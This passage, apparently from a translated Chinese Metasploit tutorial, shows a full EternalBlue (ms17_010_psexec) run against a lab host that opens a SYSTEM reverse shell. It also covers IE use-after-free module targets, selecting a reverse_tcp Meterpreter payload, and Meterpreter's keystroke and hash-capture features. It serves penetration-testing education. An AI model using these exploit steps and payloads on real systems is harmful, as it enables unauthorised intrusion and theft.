   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                         rdlists/named_pipes.txt
   RHOSTS                10.10.10.40                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                            /wiki/Using-Metasploit
   RPORT                 445                                      yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                           no        The service display name
   SERVICE_NAME                                                   no        The service name
   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no
                                                                            rmal read/write folder share
   SMBDomain             .                                        no        The Windows domain to use for authentication
   SMBPass                                                        no        The password for the specified username
   SMBUser                                                        no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

一旦一切就绪并准备就绪，我们就可以继续发起攻击。请注意，此处未设置有效载荷，因为默认的有效载荷足以进行此演示。

#### MSF - 利用执行

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > run

[*] Started reverse TCP handler on 10.10.14.15:4444 
[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.10.40:445 - Connecting to target for exploitation.
[+] 10.10.10.40:445 - Connection established for exploitation.
[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet
[*] 10.10.10.40:445 - Starting non-paged pool grooming
[+] 10.10.10.40:445 - Sending SMBv2 buffers
[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.10.40:445 - Sending final SMBv2 buffers.
[*] 10.10.10.40:445 - Sending last fragment of exploit packet!
[*] 10.10.10.40:445 - Receiving response from exploit packet
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.10.40:445 - Sending egg to corrupted connection.
[*] 10.10.10.40:445 - Triggering free of corrupted buffer.
[*] Command shell session 1 opened (10.10.14.15:4444 -> 10.10.10.40:49158) at 2020-08-13 21:37:21 +0000
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


meterpreter> shell

C:\Windows\system32>
```

我们现在在目标机器上有一个 shell，我们可以与它交互。

#### MSF - 目标交互

```shell-session
C:\Windows\system32> whoami

whoami
nt authority\system
```

这是一个如何`msfconsole`快速提供帮助的快速而肮脏的示例，但却是该框架如何工作的一个很好的示例。只需要一个模块，没有任何`payload`选择，`encoding`或者`pivoting`在会话或作业之间。

## 目标

`Targets`是从那些特定操作系统的版本中获取的唯一操作系统标识符，这些操作系统使选定的漏洞利用模块可以在该特定版本的操作系统上运行。在漏洞利用模块视图中发出的命令`show targets`将显示该特定漏洞利用的所有可用漏洞目标，而在根菜单中发出相同的命令，在任何选定的漏洞利用模块之外，将让我们知道我们需要首先选择一个漏洞利用模块。

#### MSF - 显示目标

 MSF - 显示目标

```shell-session
msf6 > show targets

[-] No exploit module selected.
```

当查看我们之前的漏洞利用模块时，这将是我们看到的：

 MSF - 显示目标

```shell-session
msf6 exploit(windows/smb/ms17_010_psexec) > options

   Name                  Current Setting                          Required  Description
   ----                  ---------------                          --------  -----------
   DBGTRACE              false                                    yes       Show extra debug trace info
   LEAKATTEMPTS          99                                       yes       How many times to try to leak transaction
   NAMEDPIPE                                                      no        A named pipe that can be connected to (leave blank for auto)
   NAMED_PIPES           /usr/share/metasploit-framework/data/wo  yes       List of named pipes to check
                         rdlists/named_pipes.txt
   RHOSTS                10.10.10.40                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework
                                                                            /wiki/Using-Metasploit
   RPORT                 445                                      yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                            no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                                           no        The service display name
   SERVICE_NAME                                                   no        The service name
   SHARE                 ADMIN$                                   yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a no
                                                                            rmal read/write folder share
   SMBDomain             .                                        no        The Windows domain to use for authentication
   SMBPass                                                        no        The password for the specified username
   SMBUser                                                        no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

### 选择目标

我们可以看到这种类型的攻击只有一种通用类型的目标集。如果我们将漏洞利用模块更改为需要更具体目标范围的东西会怎样？以下漏洞利用的目的是：

- `MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability`.

如果我们想了解更多关于这个特定模块的信息以及它背后的漏洞是干什么的，我们可以使用命令`info`。当我们不确定不同漏洞利用或辅助模块的来源或功能时，此命令可以帮助我们。请记住，审核我们的代码以获取任何工件生成或“附加功能”始终被认为是最佳实践，该`info`命令应该是我们在使用新模块时采取的首要步骤之一。通过这种方式，我们可以熟悉漏洞利用功能，同时确保为我们的客户和我们提供安全、干净的工作环境。

#### MSF - 目标选择

 MSF - 目标选择

```shell-session
msf6 exploit(windows/browser/ie_execcommand_uaf) > info

       Name: MS12-063 Microsoft Internet Explorer execCommand Use-After-Free Vulnerability 
     Module: exploit/windows/browser/ie_execcommand_uaf
   Platform: Windows
       Arch: 
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Good
  Disclosed: 2012-09-14

Provided by:
  unknown
  eromang
  binjo
  sinn3r <sinn3r@metasploit.com>
  juan vazquez <juan.vazquez@metasploit.com>

Available targets:
  Id  Name
  --  ----
  0   Automatic
  1   IE 7 on Windows XP SP3
  2   IE 8 on Windows XP SP3
  3   IE 7 on Windows Vista
  4   IE 8 on Windows Vista
  5   IE 8 on Windows 7
  6   IE 9 on Windows 7

Check supported:
  No

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  OBFUSCATE  false            no        Enable JavaScript obfuscation
  SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
  SRVPORT    8080             yes       The local port to listen on.
  SSL        false            no        Negotiate SSL for incoming connections
  SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
  URIPATH                     no        The URI to use for this exploit (default is random)

Payload information:

Description:
  This module exploits a vulnerability found in Microsoft Internet 
  Explorer (MSIE). When rendering an HTML page, the CMshtmlEd object 
  gets deleted in an unexpected manner, but the same memory is reused 
  again later in the CMshtmlEd::Exec() function, leading to a 
  use-after-free condition. Please note that this vulnerability has 
  been exploited since Sep 14, 2012. Also, note that 
  presently, this module has some target dependencies for the ROP 
  chain to be valid. For WinXP SP3 with IE8, msvcrt must be present 
  (as it is by default). For Vista or Win7 with IE8, or Win7 with IE9, 
  JRE 1.6.x or below must be installed (which is often the case).

References:
  https://cvedetails.com/cve/CVE-2012-4969/
  OSVDB (85532)
  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2012/MS12-063
  http://technet.microsoft.com/en-us/security/advisory/2757760
  http://eromang.zataz.com/2012/09/16/zero-day-season-is-really-not-over-yet/
```

查看描述，我们可以大致了解此漏洞利用将为我们完成什么。牢记这一点，我们接下来要检查哪些版本容易受到此漏洞的攻击。

 MSF - 目标选择

```shell-session
msf6 exploit(windows/browser/ie_execcommand_uaf) > options

Module options (exploit/windows/browser/ie_execcommand_uaf):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   OBFUSCATE  false            no        Enable JavaScript obfuscation
   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL for incoming connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                     no        The URI to use for this exploit (default is random)


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic
   1   IE 7 on Windows XP SP3
   2   IE 8 on Windows XP SP3
   3   IE 7 on Windows Vista
   4   IE 8 on Windows Vista
   5   IE 8 on Windows 7
   6   IE 9 on Windows 7
```

我们看到了不同版本的 Internet Explorer 和各种 Windows 版本的选项。保留选择将`Automatic`让 msfconsole 知道它需要在发起成功攻击之前对给定目标执行服务检测。

但是，如果我们知道我们的目标上运行的是什么版本，我们可以使用该`set target <index no.>`命令从列表中选择一个目标。

 MSF - 目标选择

```shell-session
msf6 exploit(windows/browser/ie_execcommand_uaf) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic
   1   IE 7 on Windows XP SP3
   2   IE 8 on Windows XP SP3
   3   IE 7 on Windows Vista
   4   IE 8 on Windows Vista
   5   IE 8 on Windows 7
   6   IE 9 on Windows 7


msf6 exploit(windows/browser/ie_execcommand_uaf) > set target 6

target => 6
```

### 目标类型

目标类型多种多样。每个目标都可能因服务包、操作系统版本甚至语言版本而异。这完全取决于目标或漏洞利用模块中的返回地址和其他参数。

返回地址可能会有所不同，因为特定的语言包更改了地址，有不同的软件版本可用，或者地址因挂钩而移动。这完全取决于识别目标所需的返回地址类型。该地址可以是`jmp esp`，跳转到标识目标的特定寄存器，或`pop/pop/ret`. 有关返回地址主题的更多信息，请参阅[Windows x86](https://academy.hackthebox.com/module/89/section/931)模块上基于堆栈的缓冲区溢出。利用模块代码中的注释可以帮助我们确定目标的定义。

要正确识别目标，我们需要：

- 获取目标二进制文件的副本
- 使用 msfpescan 找到合适的返回地址

在本模块的后面，我们将更深入地研究漏洞利用开发、有效负载生成和目标识别。

## 有效载荷

Metasploit 中的A`Payload`指的是帮助漏洞利用模块（通常）将 shell 返回给攻击者的模块。有效载荷与漏洞本身一起发送，以绕过易受攻击服务的标准功能程序 ( `exploits job`)，然后在目标操作系统上运行，通常向攻击者返回反向连接并建立立足点 ( `payload's job`)。

Metasploit 框架中有三种不同类型的有效载荷模块：Singles、Stagers 和 Stages。使用三种有效载荷交互类型将被证明对渗透测试者有益。它可以提供我们执行某些类型任务所需的灵活性。有效载荷是否暂存由`/`有效载荷名称表示。

例如，`windows/shell_bind_tcp`是一个没有阶段的单个有效载荷，而`windows/shell/bind_tcp`由一个 stager ( `bind_tcp`) 和一个阶段 ( `shell`) 组成。

### Singles

有效负载`Single`包含所选任务的漏洞和整个 shellcode。内联有效载荷在设计上比同类有效载荷更稳定，因为它们包含所有内容。然而，一些漏洞利用将不支持这些有效负载的最终大小，因为它们可能会变得非常大。`Singles`是独立的有效载荷。它们是在目标系统上发送和执行的唯一对象，运行后立即得到结果。单个有效负载可以像将用户添加到目标系统或启动进程一样简单。

### stager

`Stager`payloads 与 Stage payloads 一起工作来执行特定的任务。一个 Stager 在攻击者机器上等待，准备在该阶段在远程主机上完成运行后与受害主机建立连接。`Stagers`通常用于在攻击者和受害者之间建立网络连接，并且设计得小巧可靠。Metasploit 将使用最好的一个，并在必要时退回到不太喜欢的那个。

Windows NX 与 NO-NX Stagers

- NX CPU 和 DEP 的可靠性问题
- NX stagers 更大（VirtualAlloc 内存）
- 现在默认为 NX + Win7 兼容

### stages

`Stages`是由 stager 的模块下载的有效负载组件。各种有效负载阶段提供没有大小限制的高级功能，例如 Meterpreter、VNC 注入等。有效载荷阶段自动使用中间阶段：

- 一个单一的`recv()`失败与大的有效载荷
- Stager 接收中间 stager
- 中间的 Stager 然后执行完整的下载
- 对 RWX 也更好

## 分阶段有效载荷

简单地说，分阶段有效载荷是一种`exploitation process`模块化且功能分离的有效载荷，有助于将其完成的不同功能隔离到不同的代码块中，每个代码块单独完成其目标，但致力于将攻击链接在一起。如果所有阶段都正常工作，这最终将授予攻击者远程访问目标机器的权限。

与任何其他有效负载一样，除了授予对目标系统的 shell 访问权限外，此有效负载的范围应尽可能紧凑和不显眼，以尽可能地帮助防病毒 () / 入侵防御系统 () 规避`AV`。`IPS`

`Stage0`分段有效载荷的一部分表示通过网络发送到目标机器易受攻击的服务的初始 shellcode，其唯一目的是初始化与攻击者机器的连接。这就是所谓的反向连接。作为 Metasploit 用户，我们会遇到这些通用名称`reverse_tcp`、`reverse_https`和`bind_tcp`。例如，在`show payloads`命令下，您可以查找如下所示的有效负载：

#### MSF - 分阶段有效载荷

 MSF - 分阶段有效载荷

```shell-session
msf6 > show payloads

<SNIP>

535  windows/x64/meterpreter/bind_ipv6_tcp                                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
536  windows/x64/meterpreter/bind_ipv6_tcp_uuid                           normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
537  windows/x64/meterpreter/bind_named_pipe                              normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
538  windows/x64/meterpreter/bind_tcp                                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
539  windows/x64/meterpreter/bind_tcp_rc4                                 normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)
540  windows/x64/meterpreter/bind_tcp_uuid                                normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)
541  windows/x64/meterpreter/reverse_http                                 normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
542  windows/x64/meterpreter/reverse_https                                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
543  windows/x64/meterpreter/reverse_named_pipe                           normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
544  windows/x64/meterpreter/reverse_tcp                                  normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
545  windows/x64/meterpreter/reverse_tcp_rc4                              normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
546  windows/x64/meterpreter/reverse_tcp_uuid                             normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
547  windows/x64/meterpreter/reverse_winhttp                              normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
548  windows/x64/meterpreter/reverse_winhttps                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)

<SNIP>
```

​	反向连接不太可能触发预防系统，例如初始化连接的是受害者主机，该主机大部分时间驻留在所谓的`security trust zone`. 然而，当然，网络的安全设备和人员不会盲目地遵循这种信任策略，因此即使是在这一步，攻击者也必须谨慎行事。

​	Stage0 代码还旨在在到达后将更大的后续有效负载读入内存。在攻击者和受害者之间建立稳定的通信通道后，攻击者机器很可能会发送一个更大的有效载荷阶段，这应该授予他们 shell 访问权限。这个更大的有效载荷将是`Stage1`有效载荷。我们将在后面的部分中进行更详细的介绍。

#### Meterpreter 载荷

有效载荷`Meterpreter`是一种特定类型的多面有效载荷，用于`DLL injection`确保与受害主机的连接稳定，难以通过简单检查检测到，并在重启或系统更改后保持不变。Meterpreter 完全驻留在远程主机的内存中，不会在硬盘上留下任何痕迹，因此很难用传统的取证技术进行检测。此外，脚本和插件可以`loaded and unloaded`根据需要动态配置。

一旦执行了 Meterpreter 负载，就会创建一个新会话，它会生成 Meterpreter 接口。它与 msfconsole 界面非常相似，但所有可用的命令都是针对目标系统的，有效负载已“感染”该系统。它为我们提供了大量有用的命令，从击键捕获、密码哈希收集、麦克风窃听和屏幕截图到模拟进程安全令牌。我们将在后面的部分中深入研究有关 Meterpreter 的更多细节。

使用 Meterpreter，我们还可以`load`在不同的 Plugins 中协助我们进行评估。我们将在本模块的插件部分详细讨论这些内容。

## 搜索有效载荷

​	要选择我们的第一个有效载荷，我们需要知道我们想在目标机器上做什么。例如，如果我们要访问持久化，我们可能会想要选择一个 Meterpreter 负载。

如上所述，Meterpreter 有效负载为我们提供了极大的灵活性。它们的基本功能已经非常广泛且具有影响力。我们可以自动化并快速交付与渗透测试的[GentilKiwi 的 Mimikatz 插件](https://github.com/gentilkiwi/mimikatz)等插件相结合的部分，同时保持有组织、高效的评估。要查看所有可用的有效负载，请使用`show payloads`中的命令`msfconsole`。

#### MSF - 列出有效载荷

 MSF - 列出有效载荷

```shell-session
msf6 > show payloads

Payloads
========

   #    Name                                                Disclosure Date  Rank    Check  Description
-    ----                                                ---------------  ----    -----  -----------
   0    aix/ppc/shell_bind_tcp                                               manual  No     AIX Command Shell, Bind TCP Inline
   1    aix/ppc/shell_find_port                                              manual  No     AIX Command Shell, Find Port Inline
   2    aix/ppc/shell_interact                                               manual  No     AIX execve Shell for inetd
   3    aix/ppc/shell_reverse_tcp                                            manual  No     AIX Command Shell, Reverse TCP Inline
   4    android/meterpreter/reverse_http                                     manual  No     Android Meterpreter, Android Reverse HTTP Stager
   5    android/meterpreter/reverse_https                                    manual  No     Android Meterpreter, Android Reverse HTTPS Stager
   6    android/meterpreter/reverse_tcp                                      manual  No     Android Meterpreter, Android Reverse TCP Stager
   7    android/meterpreter_reverse_http                                     manual  No     Android Meterpreter Shell, Reverse HTTP Inline
   8    android/meterpreter_reverse_https                                    manual  No     Android Meterpreter Shell, Reverse HTTPS Inline
   9    android/meterpreter_reverse_tcp                                      manual  No     Android Meterpreter Shell, Reverse TCP Inline
   10   android/shell/reverse_http                                           manual  No     Command Shell, Android Reverse HTTP Stager
   11   android/shell/reverse_https                                          manual  No     Command Shell, Android Reverse HTTPS Stager
   12   android/shell/reverse_tcp                                            manual  No     Command Shell, Android Reverse TCP Stager
   13   apple_ios/aarch64/meterpreter_reverse_http                           manual  No     Apple_iOS Meterpreter, Reverse HTTP Inline
   
<SNIP>
   
   557  windows/x64/vncinject/reverse_tcp                                    manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse TCP Stager
   558  windows/x64/vncinject/reverse_tcp_rc4                                manual  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   559  windows/x64/vncinject/reverse_tcp_uuid                               manual  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager with UUID Support (Windows x64)
   560  windows/x64/vncinject/reverse_winhttp                                manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (winhttp)
   561  windows/x64/vncinject/reverse_winhttps                               manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTPS Stager (winhttp)
```

​	如上所示，有很多可用的有效载荷可供选择。不仅如此，我们还可以使用创建我们的有效载荷`msfvenom`，但我们稍后会深入探讨。我们将使用与以前相同的目标，而不是使用默认的有效载荷，这是一个简单的`reverse_tcp_shell`，我们将使用一个`Meterpreter Payload for Windows 7(x64)`.

滚动上面的列表，我们找到包含`Meterpreter Payloads for Windows(x64)`.

 MSF - 列出有效载荷

```shell-session
   515  windows/x64/meterpreter/bind_ipv6_tcp                                manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
   516  windows/x64/meterpreter/bind_ipv6_tcp_uuid                           manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
   517  windows/x64/meterpreter/bind_named_pipe                              manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
   518  windows/x64/meterpreter/bind_tcp                                     manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
   519  windows/x64/meterpreter/bind_tcp_rc4                                 manual  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)
   520  windows/x64/meterpreter/bind_tcp_uuid                                manual  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)
   521  windows/x64/meterpreter/reverse_http                                 manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
   522  windows/x64/meterpreter/reverse_https                                manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
   523  windows/x64/meterpreter/reverse_named_pipe                           manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
   524  windows/x64/meterpreter/reverse_tcp                                  manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   525  windows/x64/meterpreter/reverse_tcp_rc4                              manual  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   526  windows/x64/meterpreter/reverse_tcp_uuid                             manual  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
   527  windows/x64/meterpreter/reverse_winhttp                              manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
   528  windows/x64/meterpreter/reverse_winhttps                             manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)
   529  windows/x64/meterpreter_bind_named_pipe                              manual  No     Windows Meterpreter Shell, Bind Named Pipe Inline (x64)
   530  windows/x64/meterpreter_bind_tcp                                     manual  No     Windows Meterpreter Shell, Bind TCP Inline (x64)
   531  windows/x64/meterpreter_reverse_http                                 manual  No     Windows Meterpreter Shell, Reverse HTTP Inline (x64)
   532  windows/x64/meterpreter_reverse_https                                manual  No     Windows Meterpreter Shell, Reverse HTTPS Inline (x64)
   533  windows/x64/meterpreter_reverse_ipv6_tcp                             manual  No     Windows Meterpreter Shell, Reverse TCP Inline (IPv6) (x64)
   534  windows/x64/meterpreter_reverse_tcp                                  manual  No     Windows Meterpreter Shell, Reverse TCP Inline x64
```

正如我们所见，在如此庞大的列表中找到所需的有效负载可能非常耗时。我们还可以使用`grep`in`msfconsole`来过滤掉特定的术语。这将加快搜索速度，从而加快我们的选择速度。

我们必须`grep`在开头输入带有相应参数的命令，然后输入要进行过滤的命令。例如，让我们假设我们希望为我们的漏洞利用处理一个`TCP`基础。因此，我们可以首先搜索有效负载中包含该词的所有结果。`reverse shell``Meterpreter``Meterpreter`

#### MSF - 搜索特定有效载荷

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter show payloads

   6   payload/windows/x64/meterpreter/bind_ipv6_tcp                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
   7   payload/windows/x64/meterpreter/bind_ipv6_tcp_uuid                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
   8   payload/windows/x64/meterpreter/bind_named_pipe                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager
   9   payload/windows/x64/meterpreter/bind_tcp                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager
   10  payload/windows/x64/meterpreter/bind_tcp_rc4                         normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)
   11  payload/windows/x64/meterpreter/bind_tcp_uuid                        normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)
   12  payload/windows/x64/meterpreter/reverse_http                         normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
   13  payload/windows/x64/meterpreter/reverse_https                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)
   14  payload/windows/x64/meterpreter/reverse_named_pipe                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager
   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
   18  payload/windows/x64/meterpreter/reverse_winhttp                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)
   19  payload/windows/x64/meterpreter/reverse_winhttps                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)


msf6 exploit(windows/smb/ms17_010_eternalblue) > grep -c meterpreter show payloads

[*] 14
```

这给了我们一个总的`14`结果。现在我们可以在第一个命令之后添加另一个`grep`命令并搜索`reverse_tcp`.

 MSF - 搜索特定有效载荷

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads

   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)
   
   
msf6 exploit(windows/smb/ms17_010_eternalblue) > grep -c meterpreter grep reverse_tcp show payloads

[*] 3
```

在 的帮助下`grep`，我们将我们想要的有效载荷列表减少到更少。当然，该`grep`命令可用于所有其他命令。我们只需要知道我们在寻找什么。

## 选择有效载荷

与模块一样，我们需要我们想要使用的条目的索引号。要为当前选定的模块设置有效负载，我们`set payload <no.>`仅在选择一个漏洞利用模块后才使用。

#### MSF - 选择负载

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs



msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads

   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager
   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)


msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15

payload => windows/x64/meterpreter/reverse_tcp
```

选择有效载荷后，我们将有更多选择。

```shell-session
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs
```

正如我们所见，通过`show payloads`在 Exploit 模块本身中运行命令，msfconsole 检测到目标是 Windows 机器，因此只显示针对 Windows 操作系统的有效负载。

我们还可以看到出现了一个新的选项字段，它与有效负载参数将包含的内容直接相关。我们将关注`LHOST`和`LPORT`（我们的攻击者 IP 和反向连接初始化所需的端口）。当然，如果攻击失败，我们总是可以使用不同的端口并重新发起攻击。

